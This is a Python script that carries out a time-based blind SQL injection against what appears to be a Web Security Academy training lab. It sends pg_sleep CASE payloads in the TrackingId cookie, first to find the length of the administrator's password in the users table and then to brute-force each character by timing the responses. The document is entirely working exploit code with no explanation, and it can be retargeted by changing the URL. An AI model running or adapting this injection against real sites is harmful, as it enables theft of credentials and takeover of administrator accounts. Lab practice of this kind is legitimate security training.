import requests
import string


url = 'https://0a4800f404948b1282de7eb900e500da.web-security-academy.net/'

tid='L4LA0awXDPeXZjLD'


cookie={"TrackingId":tid}

response = requests.get(url,cookies=cookie)


if "The Splash" in response.text:
    print("[+] Testing connection  successfully")


length_pass=0

for i in range(101):
    print("[-] finding the length of password with",i)
    tid = f"L4LA0awXDPeXZjLD' || (select CASE WHEN (LENGTH(password)={i}) THEN pg_sleep(5) ELSE pg_sleep(0) END from users where username='administrator')--"
    cookie={"TrackingId":tid}
    response = requests.get(url,cookies=cookie)
    
    if response.elapsed.total_seconds()>4:
        repeat_response = requests.get(url,cookies=cookie)
        if repeat_response.elapsed.total_seconds()>4 :
            length_pass=i
        break

print("[!] boom! we have found that:",length_pass)


txt = string.ascii_lowercase + string.digits+string.ascii_uppercase

pass_admin=''

for i in range(1,length_pass+1):
    for j in txt:
        pass_admin+=j
        print("[-] Testing brutforce password with:",pass_admin)
        tid = f"L4LA0awXDPeXZjLD' ||  (select CASE WHEN (SUBSTR(password,1,{i})='{pass_admin}') THEN pg_sleep(5) ELSE pg_sleep(0) END from users where username='administrator')--"
        cookie={"TrackingId":tid}
        response = requests.get(url,cookies=cookie)
        if response.elapsed.total_seconds()>4:
            repeat_response = requests.get(url,cookies=cookie)
            if repeat_response.elapsed.total_seconds()>4.5:
                break
            else:
                pass_admin=pass_admin[:-1]
        else:
            pass_admin=pass_admin[:-1]
print("[++] full password",pass_admin)